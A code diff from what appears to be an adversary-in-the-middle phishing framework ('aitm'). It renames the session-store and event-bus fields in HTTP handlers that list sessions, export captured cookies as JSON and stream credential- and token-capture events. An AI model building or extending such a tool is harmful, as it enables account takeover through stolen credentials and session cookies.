@@ -38,7 +38,7 @@ func (r *Router) listSessions(w http.ResponseWriter, req *http.Request) {
 		filter.Before = t
 	}
 
-	sessions, err := r.sessions.List(filter)
+	sessions, err := r.Sessions.List(filter)
 	if err != nil {
 		writeError(w, http.StatusInternalServerError, "failed to list sessions")
 		return
@@ -47,7 +47,7 @@ func (r *Router) listSessions(w http.ResponseWriter, req *http.Request) {
 	countFilter := filter
 	countFilter.Limit = 0
 	countFilter.Offset = 0
-	total, err := r.sessions.Count(countFilter)
+	total, err := r.Sessions.Count(countFilter)
 	if err != nil {
 		writeError(w, http.StatusInternalServerError, "failed to count sessions")
 		return
@@ -67,7 +67,7 @@ func (r *Router) listSessions(w http.ResponseWriter, req *http.Request) {
 
 func (r *Router) getSession(w http.ResponseWriter, req *http.Request) {
 	id := req.PathValue("id")
-	sess, err := r.sessions.Get(id)
+	sess, err := r.Sessions.Get(id)
 	if err != nil {
 		if errors.Is(err, aitm.ErrNotFound) {
 			writeError(w, http.StatusNotFound, "session does not exist")
@@ -81,7 +81,7 @@ func (r *Router) getSession(w http.ResponseWriter, req *http.Request) {
 
 func (r *Router) deleteSession(w http.ResponseWriter, req *http.Request) {
 	id := req.PathValue("id")
-	if err := r.sessions.Delete(id); err != nil {
+	if err := r.Sessions.Delete(id); err != nil {
 		if errors.Is(err, aitm.ErrNotFound) {
 			writeError(w, http.StatusNotFound, "session does not exist")
 		} else {
@@ -94,7 +94,7 @@ func (r *Router) deleteSession(w http.ResponseWriter, req *http.Request) {
 
 func (r *Router) exportSessionCookies(w http.ResponseWriter, req *http.Request) {
 	id := req.PathValue("id")
-	data, err := r.sessions.ExportCookiesJSON(id)
+	data, err := r.Sessions.ExportCookiesJSON(id)
 	if err != nil {
 		if errors.Is(err, aitm.ErrNotFound) {
 			writeError(w, http.StatusNotFound, "session does not exist")
@@ -115,15 +115,15 @@ func (r *Router) streamSessions(w http.ResponseWriter, req *http.Request) {
 		return
 	}
 
-	chCreated := r.bus.Subscribe(aitm.EventSessionCreated)
-	chCreds := r.bus.Subscribe(aitm.EventCredsCaptured)
-	chTokens := r.bus.Subscribe(aitm.EventTokensCaptured)
-	chCompleted := r.bus.Subscribe(aitm.EventSessionCompleted)
+	chCreated := r.Bus.Subscribe(aitm.EventSessionCreated)
+	chCreds := r.Bus.Subscribe(aitm.EventCredsCaptured)
+	chTokens := r.Bus.Subscribe(aitm.EventTokensCaptured)
+	chCompleted := r.Bus.Subscribe(aitm.EventSessionCompleted)
 	defer func() {
-		r.bus.Unsubscribe(aitm.EventSessionCreated, chCreated)
-		r.bus.Unsubscribe(aitm.EventCredsCaptured, chCreds)
-		r.bus.Unsubscribe(aitm.EventTokensCaptured, chTokens)
-		r.bus.Unsubscribe(aitm.EventSessionCompleted, chCompleted)
+		r.Bus.Unsubscribe(aitm.EventSessionCreated, chCreated)
+		r.Bus.Unsubscribe(aitm.EventCredsCaptured, chCreds)
+		r.Bus.Unsubscribe(aitm.EventTokensCaptured, chTokens)
+		r.Bus.Unsubscribe(aitm.EventSessionCompleted, chCompleted)
 	}()
 
 	sse.WriteEvent("connected", []byte(`{"status":"connected"}`))
